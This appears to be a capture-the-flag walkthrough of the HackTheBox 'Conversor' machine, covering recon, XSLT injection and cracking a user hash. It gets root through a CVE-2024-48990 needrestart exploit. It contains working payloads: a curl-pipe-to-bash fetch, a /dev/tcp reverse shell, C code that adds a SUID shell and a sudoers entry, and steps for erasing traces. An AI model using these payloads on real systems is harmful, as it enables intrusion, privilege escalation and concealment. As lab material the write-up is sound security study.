---


---

<h1 id="conversor-htb">Conversor HTB</h1>
<h2 id="introduction">Introduction</h2>
<p>Conversor is a machine where you will learn to exploit file upload vulnerability, one of the most common vulnerability, this machine also challenges your programation skill in different languages.</p>
<h2 id="step-1-nmap-recognition">Step 1, nmap recognition</h2>
<p>First, we connect to the machine and do an easy nmap, with basic flags for nmap, the next ones:</p>
<pre class=" language-bash"><code class="prism  language-bash">nmap --min-rate 5000 -p- -n -Pn -sS 10.10.11.92 -oX nmap.xml
</code></pre>
<ul>
<li><strong>—min-rate 5000:</strong> This flag tells nmap to send a minimum of 5000 packets per second</li>
<li><strong>-p-:</strong> Scans the 65535 existent ports</li>
<li><strong>-n:</strong>  It prevents from DNS resolving</li>
<li><strong>-Pn:</strong> Disable host discovery scanning (ping)</li>
<li><strong>-sS:</strong> Prevent from doing three-way handshake</li>
<li><strong>10.10.11.87:</strong> The IP address that we want to scan</li>
<li><strong>-oX nmap.xml:</strong> This mean, nmap will save the scan in a file, we will need a xml later</li>
</ul>
<p>The nmap report the next ports:</p>
<pre><code>PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre>
<p>So, we have the next information:</p>
<ul>
<li>It’s a web server, hosted in port 80</li>
<li>It also has the SSH service</li>
</ul>
<p>Let’s make an exhaustive scan in both ports:</p>
<pre class=" language-bash"><code class="prism  language-bash">nmap -sC -sV --min-rate 5000 -p22,80 10.10.11.92
</code></pre>
<ul>
<li><strong>-sC:</strong> Uses the most popular scripts on nmap</li>
<li><strong>-sV:</strong> List the version of the services that are running on the ports</li>
<li><strong>-p22,80:</strong> We use this when we only want to scan determitade ports, in this case, 22 and 80</li>
</ul>
<p>We get the next report:</p>
<pre class=" language-bash"><code class="prism  language-bash">PORT   STATE SERVICE VERSION
22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
80/tcp <span class="token function">open</span>  http    Apache httpd 2.4.52
<span class="token operator">|</span> http-title: Login
<span class="token operator">|</span>_Requested resource was /login
<span class="token operator">|</span>_http-server-header: Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
Nmap done: 2 IP addresses <span class="token punctuation">(</span>2 hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 17.32 seconds
</code></pre>
<p>After this, if you want, you can do an ssh-auth-methods for SSH protocol with the next flags:</p>
<pre class=" language-bash"><code class="prism  language-bash">nmap --script ssh-auth-methods -p 22 --min-rate 5000 10.10.11.92
</code></pre>
<p>We get we can access with a publickey or a password:</p>
<pre class=" language-bash"><code class="prism  language-bash">PORT   STATE SERVICE
22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token operator">|</span> ssh-auth-methods: 
<span class="token operator">|</span>   Supported authentication methods: 
<span class="token operator">|</span>     publickey
<span class="token operator">|</span>_    password
80/tcp <span class="token function">open</span>  http
</code></pre>
<p>This means later we can re-use some password in this service, with this, we end our recognition phase.</p>
<h2 id="step-2-web-recognition">Step 2, web recognition</h2>
<p>Okey let’s try to connect to the web:</p>
<p><img src="image/img.png" alt="Connection Error"></p>
<p>This happens because our machine doesn’t know what the IP address means. To fix this, we need to do the following:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sudo</span> <span class="token function">nano</span> /etc/hosts
<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
10.10.11.92 conversor.htb <span class="token comment">#&lt;---End of the file</span>
</code></pre>
<blockquote>
<p>The /etc/hosts file is an operating system configuration file (present in Linux, macOS, and other Unix-like systems) used to manually associate IP addresses with domain or host names.</p>
<p>In other words, it acts as a local mini DNS database.</p>
<p>Before the system queries a DNS server, it checks this file to see if the address is already defined there.</p>
<p>Usually HTB machines use the DNS name in the following format:<br>
machine_name.htb</p>
</blockquote>
<p>After we get access to the web, we will see a login panel, something like this:<br>
<img src="image/img2.png" alt="{Login Panel}"></p>
<p>We don’t have credentials, so lets make an account, user and password doesn’t matters, do something like 1234:<br>
<img src="image/img3.png" alt="{Register Panel}"></p>
<p>After creating an account and login in the website, we can see a upload file GUI, you can see a field where you need to upload a XML, and another with XSLT, let’s understand what each format is used for.</p>
<h2 id="xml-and-xlst-explanation">XML and XLST Explanation</h2>
<p>If you already know what is XML and XLST, you can jump to the next step, but if you want to know what each language is used for, read the next:</p>
<h3 id="xml">XML</h3>
<ul>
<li>It’s like HTML but customizable</li>
<li>You define your own tags. It stores and transports data</li>
<li>Structured and readable.</li>
</ul>
<p>Example:</p>
<pre class=" language-xml"><code class="prism  language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<h3 id="xslt">XSLT</h3>
<ul>
<li>
<p>Transforms XML into other formats, like a “translator”</p>
</li>
<li>
<p>Converts XML data to HTML, PDF, or other XML formats</p>
</li>
<li>
<p>Example: Takes the above XML and converts it into an HTML table</p>
</li>
</ul>
<pre class=" language-xml"><code class="prism  language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xsl:</span>stylesheet</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xsl:</span>template</span> <span class="token attr-name">match</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xsl:</span>value-of</span> <span class="token attr-name">select</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user/name<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>id: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xsl:</span>value-of</span> <span class="token attr-name">select</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user/id<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xsl:</span>template</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xsl:</span>stylesheet</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<h3 id="where-to-use-in-cibersecurity">Where to use in cibersecurity?</h3>
<ul>
<li>XXE (XML External Entity): Injecting malicious code into XML</li>
<li>XSLT Injection: Manipulating transformations to execute malicious code</li>
</ul>
<hr>
<h3 id="web-fuzzing">Web fuzzing</h3>
<p>After we log in, we can try to upload files, but first let’s try some web fuzzing with ffuf:</p>
<pre><code>ffuf -u http://conversor.htb/FUZZ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</code></pre>
<ul>
<li><strong>-u:</strong> The URL we want to scan, with ffuf tool, we have to specify where to fuzz, if you can see, we use FUZZ to say where we want to make the scan</li>
<li><strong>-w:</strong> The wordlist we want to use, usually we want to use some from SecLists</li>
</ul>
<p>After doing the fuzz, we discover a directory called “/about”, let’s go in the directory:<br>
<img src="images/img4.png" alt="/about directory"></p>
<p>We see an option called “Download Source Code”, if we download it, its a backup of the web but, without any credential, is full empty, but we can see the inside structure of the web, we see in the “instance” directory there is a DB with 2 tables, files and users, maybe we want to try later to look over here.</p>
<h2 id="step-3-reverse-shell">Step 3, reverse shell</h2>
<p>So, once we know what is each type of file that we can upload, lets try to do some reverse shell, is easy, the technique will be something like:</p>
<p>WebSite --&gt;<br>
Upload <strong>malicious</strong> XML and XLST with a reverse shell --&gt;<br>
Webserver <strong>execute</strong> malicious code --&gt;<br>
We got <strong>connection</strong> in the machine as www-data with netcat</p>
<p>Once we know what we have to do, let’s get to work, first, we will write our malicious XSLT:</p>
<pre class=" language-xml"><code class="prism  language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xsl:</span>stylesheet</span> 
    <span class="token attr-name"><span class="token namespace">xmlns:</span>xsl</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/XSL/Transform<span class="token punctuation">"</span></span> 
    <span class="token attr-name"><span class="token namespace">xmlns:</span>shell</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://exslt.org/common<span class="token punctuation">"</span></span>
    <span class="token attr-name">extension-element-prefixes</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>shell<span class="token punctuation">"</span></span>
    <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span>
<span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xsl:</span>template</span> <span class="token attr-name">match</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">shell:</span>document</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/var/www/conversor.htb/scripts/shell.py<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
import os			
os.system("curl 10.10.XX.XX:8000/shell.sh|bash")  // CHANGE WITH YOUR IP AND FILENAME!!
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">shell:</span>document</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xsl:</span>template</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xsl:</span>stylesheet</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<blockquote>
<p>Little explanation of this script,  its writed on python:<br>
1.- We import OS library, for execute commands on the web once it executes, explained why it executes before<br>
2.- Uses the function .system to do a curl to our IP address and our port where we are hosting our python server, and downloads our file, in this case “<a href="http://shell.sh">shell.sh</a>”<br>
3.- After it downloads <a href="http://shell.sh">shell.sh</a>, we use a | to say to the system, the next command we want is to execute a bash</p>
</blockquote>
<p>Once we have our Shell.xslt, we have to write our <a href="http://shell.sh">shell.sh</a>, is pretty easy to write:</p>
<pre class=" language-bash"><code class="prism  language-bash">sh -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/10.10.XX.XX/4444 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
</code></pre>
<blockquote>
<p>Explanation of the revshell:<br>
1.- “sh -i” is used to send an interactive shell to some IP and some port, in this case the IP address is 10.10.XX.XX and the port 4444<br>
2.- &gt;&amp; /dev/tcp/10.10.XX.XX/4444, redirects STDOUT(1) y STDERR(2) al socket TCP<br>
3.- Redirects STDIN(0) to where the STDOUT aims</p>
</blockquote>
<p>If you want, you can get your reverse shells in “<a href="https://www.revshells.com">https://www.revshells.com</a>”</p>
<p>After all our files are writed, we start up a server in the directory:</p>
<pre class=" language-bash"><code class="prism  language-bash">python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 <span class="token punctuation">(</span>http://0.0.0.0:8000/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
</code></pre>
<p>Okey, we have our python server running and the next files:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">ls</span>
nmap.xml Shell.xslt shell.sh
</code></pre>
<p>Nice, the second step of our reverse shell is do a netcat for getting the interactive shell, so we open a second terminal and do a netcat on the port 4444 (or the one you used for the shell)</p>
<pre class=" language-bash"><code class="prism  language-bash">nc -lvnp 4444
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.
</code></pre>
<p>We upload or .xml to the XML File section, and the same with our .xslt, and we convert, after this, the server will execute our .xslt, sending a curl for download or <a href="http://shell.sh">shell.sh</a>, (you may have wait some time because the server execute the files every minute) giving our access to the machine because we were hearing with netcat on the port 4444.</p>
<p><img src="images/img5.png" alt="File upload"></p>
<p>If we look our terminal where we were hosting the python server, we can appreciate how the IP 10.10.11.92 send a GET petition on /shell.sh, with code 200 (code 200 = connection succesful)</p>
<h2 id="step-4-first-privilege-escalation">Step 4, first privilege escalation</h2>
<p>Finally we have access as www-data, to confirm this, we do a whoami at the terminal that is inside the machine:</p>
<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token function">whoami</span>                                                                                             
www-data                                                                                                 
</code></pre>
<p>So, lets do an ls and see what we have here:</p>
<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token function">ls</span>                                                                                                 
conversor.htb                                                                                                    
</code></pre>
<p>Okey, if you remember, previously in the fuzzing, we discovered a backup of the web, that let us to know how the web is builded inside, conversor.htb is the real web, so we know there is a DB with users, let’s try use sqlite3 to navigate on the database:</p>
<pre class=" language-bash"><code class="prism  language-bash">$ sqlite3 users.db                                                                                   
.tables                                                                                              
files  <span class="token function">users</span>                                                                                                  
SELECT * FROM <span class="token function">users</span><span class="token punctuation">;</span>
1<span class="token operator">|</span>fismathack<span class="token operator">|</span>5b5c3ac<span class="token punctuation">..</span>.                                                       
<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
</code></pre>
<p>Nice, we got a hash of the backend developer, previously seen in the /about directory at the web, maybe we want to crack him hash, because if we remember, when we do our nmap, we saw we can also access SSH by password.</p>
<h2 id="step-5-cracking-password">Step 5, cracking password</h2>
<p>We save the hash in our machine, in a .txt file, something like this:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token keyword">echo</span> <span class="token string">"5b5c3ac..."</span> <span class="token operator">&gt;</span> hash.txt
</code></pre>
<p>Now we want to know what type of hash it is, we can use a lot of ways, but the two betters are, or using an hash-identifier tool, or get the hash length, I will show you both ways:</p>
<h3 id="first-way-hash-identifier">First way, hash-identifier</h3>
<ul>
<li>We have a loot of tools, but we will be using “hash-identifier”, just put that on your console, then, paste the hash</li>
</ul>
<pre class=" language-bash"><code class="prism  language-bash">HASH: 5b5c3ac<span class="token punctuation">..</span>.

Possible Hashs:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> MD5
<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
</code></pre>
<ul>
<li>So the tool says, its MD5.</li>
</ul>
<h3 id="second-way-hash-length">Second way, hash length</h3>
<ul>
<li>We will use basic commands:</li>
</ul>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">cat</span> hash.txt <span class="token operator">|</span> <span class="token function">wc</span> -c
33
</code></pre>
<ul>
<li>The tool reports 33 characters, let’s search online what hash can be, you can ask to an AI, or just search on google</li>
<li>We got the same result as before, its MD5</li>
</ul>
<p>Once we know what type of hash we have (MD5), we have to crack it, i recommend to use hashcat, and rockyou.txt wordlist:</p>
<pre class=" language-bash"><code class="prism  language-bash">hashcat -m 0 hash.txt rockyou.txt --show
</code></pre>
<ul>
<li><strong>-m 0:</strong> Used to specify what type of hash it is, in this case, MD5 stands for -m 0</li>
<li><strong>-show:</strong> Show us the password</li>
</ul>
<p>Hashcat throw the next answer:</p>
<pre class=" language-bash"><code class="prism  language-bash">5b5c3ac<span class="token punctuation">..</span>.:Keepm<span class="token punctuation">..</span>.
</code></pre>
<p>At the left, the hash, and in the right, the dehashed password.</p>
<p>Let’s enumerate what we have:</p>
<ul>
<li>We know we can connect via SSH to the machine</li>
<li>We have the password of the backend developer</li>
</ul>
<p>Now we have the password, why not to try a re-use password attack?</p>
<h2 id="step-6-user.txt">Step 6, user.txt</h2>
<p>We connect via SSH to the server with the username of the backend developer, fismat… (you have seen the name at <a href="http://conversor.htb/about">http://conversor.htb/about</a>)</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">ssh</span> fismat<span class="token punctuation">..</span>.@10.10.11.92
fismat@10.10.11.92's password:
</code></pre>
<p>This is good, the SSH accepts the username, let’s try the password that we have just cracked.</p>
<p><strong>Bingo!</strong> We are in with a user-level shell, not bad, but we want more, we want root, but first, lets try a ls:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">ls</span>
user.txt
<span class="token function">cat</span> user.txt
5d80709<span class="token punctuation">..</span>.
</code></pre>
<p>There you have, the user.txt flag.</p>
<h2 id="step-7-root.txt-flag">Step 7, root.txt flag</h2>
<p>Once we are user, we want try an easy sudo -l</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sudo</span> -l
Matching Defaults entries <span class="token keyword">for</span> fismat<span class="token punctuation">..</span>. on conversor:
    env_reset, mail_badpass,
    secure_path<span class="token operator">=</span>/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismat<span class="token punctuation">..</span>. may run the following commands on conversor:
    <span class="token punctuation">(</span>ALL <span class="token keyword">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/sbin/needrestart
</code></pre>
<p>We have a privilege escalation path, we can execute needrestart as sudo without password, lets find online some information about this.</p>
<h3 id="cve-2024-48990">CVE-2024-48990</h3>
<p>The CVE-2024-48990 is a privilege escalation vulnerability in needrestart, a tool that checks for services requiring restart.  It allows path traversal via symbolic links, enabling arbitrary file writing as root.  This vulnerability is exploited by abusing temporary files in /tmp to overwrite system files and gain root access.</p>
<p>So, let’s exploit this vulnerability and get root.</p>
<hr>
<h3 id="what-we-need">What we need?</h3>
<p>First, we will do a git clone and download the Proof of Concept of the CVE:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">git</span> clonehttps://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing"
</code></pre>
<p>(You also can get the raw file at: “<a href="https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing">https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing</a>”)<br>
After downloading this, we will do a C file, you use nano and create a file with the name of “lib.c”</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">nano</span> lib.c
</code></pre>
<p>And you paste this there (it’s how its explained at the PoC)</p>
<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Only execute if we're running with root privileges</span>
        <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>shell <span class="token operator">=</span> <span class="token string">"cp /bin/sh /tmp/poc; "</span>
                            <span class="token string">"chmod u+s /tmp/poc; "</span>
                            <span class="token string">"grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "</span>
                            <span class="token string">"echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers &gt; /dev/null &amp;"</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>After creating lib.c, we want to use a builder:</p>
<pre class=" language-bash"><code class="prism  language-bash">gcc -shared -fPIC -o __init__.so lib.c
</code></pre>
<p>This creates a output file called: <code>__init__.so</code>, from lib.c code</p>
<p>Okey, after, we open <a href="http://runner.sh">runner.sh</a> and change the IP address and port, finally, our work directory would look like this:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">ls</span>
images  __init__.so  lib.c  README.md  runner.sh
</code></pre>
<p>Images and <a href="http://README.md">README.md</a> files are irrelevant, but let them there.</p>
<p>Next step, in our ssh terminal, we go to tmp:</p>
<pre class=" language-bash"><code class="prism  language-bash">fismat<span class="token punctuation">..</span>.@conversor:~$ <span class="token function">cd</span> /tmp
</code></pre>
<p>Once we are at tmp, we start the python server on our other terminal, where all our exploits are located:</p>
<pre class=" language-bash"><code class="prism  language-bash">python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 <span class="token punctuation">(</span>http://0.0.0.0:8000/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
</code></pre>
<p>From the SSH shell, we do a wget to our ip for downloading <a href="http://runner.sh">runner.sh</a>:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">wget</span> 10.10.XX.XX:8000/runner.sh
</code></pre>
<p>We download it and give execution permissions</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">chmod</span> +x runner.sh
</code></pre>
<p>Then:</p>
<pre class=" language-bash"><code class="prism  language-bash">./runner.sh
</code></pre>
<p>We probably will see something like this:</p>
<pre class=" language-bash"><code class="prism  language-bash">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15520  100 15520    0     0   6109      0  0:00:02  0:00:02 --:--:--  6107

</code></pre>
<p>We can’t do anything, and, no, you don’t have do anything wrong, you need to open another terminal, connect via SSH and execute:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sudo</span> /usr/sbin/needrestart
</code></pre>
<p>And, in the terminal where you executed <a href="http://runner.sh">runner.sh</a>, you will see something like:</p>
<pre class=" language-bash"><code class="prism  language-bash">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15520  100 15520    0     0   6109      0  0:00:02  0:00:02 --:--:--  6107
Got shell<span class="token operator">!</span>, delete traces <span class="token keyword">in</span> /tmp/poc, /tmp/malicious

</code></pre>
<p>Just do:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">whoami</span>
root
</code></pre>
<p>Finally, we are root, go to root and open root.txt:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">cat</span> /root/root.txt
93a7bb<span class="token punctuation">..</span>.
</code></pre>
<p>You have finished conversor, congratulations!</p>
<h2 id="step-8-cleaning-our-ip-from-machine">Step 8, cleaning our IP from machine</h2>
<p>This is quite optional, but if you want to learn some OPSEC, read this:<br>
You remember previously we uploaded a shell with our IP to the server right? Well, the machine store ALL the files that are uploaded, so after we are root, we want to destroy proofs that we have been here</p>
<p>First, remove malicious directory:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">rm</span> malicious/importlib/*
<span class="token function">rmdir</span> malicious/importlib
<span class="token function">rm</span> malicious/*
<span class="token function">rmdir</span> malicious
<span class="token function">rm</span> runner.sh
</code></pre>
<p>Then, go to web configuration:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">cd</span> /var/www/conversor.htb
<span class="token function">ls</span>
app.py  app.wsgi  instance  __pycache__  scripts  static  templates  uploads
<span class="token function">cd</span> uploads
<span class="token function">ls</span>
<span class="token punctuation">[</span>you_will_see_here_all_the_files<span class="token punctuation">]</span>
<span class="token function">rm</span> Shell.xslt
<span class="token function">rm</span> nmap.xml
</code></pre>
<p>After this, we want to clean our user of the web, go to instance</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">cd</span> <span class="token punctuation">..</span>
<span class="token function">cd</span> instance
sqlite3 users.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter <span class="token string">".help"</span> <span class="token keyword">for</span> usage hints.
sqlite<span class="token operator">&gt;</span> .tables
files <span class="token function">users</span>
sqlite<span class="token operator">&gt;</span> .schema <span class="token function">users</span>
CREATE TABLE <span class="token function">users</span> <span class="token punctuation">(</span>
        <span class="token function">id</span> INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>Then, we search our user, look at the ID and use:</p>
<pre class=" language-bash"><code class="prism  language-bash">DELETE FROM <span class="token function">users</span> WHERE <span class="token function">id</span> <span class="token operator">=</span> <span class="token punctuation">{</span>your_id<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>Finally, you have completed the machine and cleaned your shells and user, this machine is fully completed!</p>

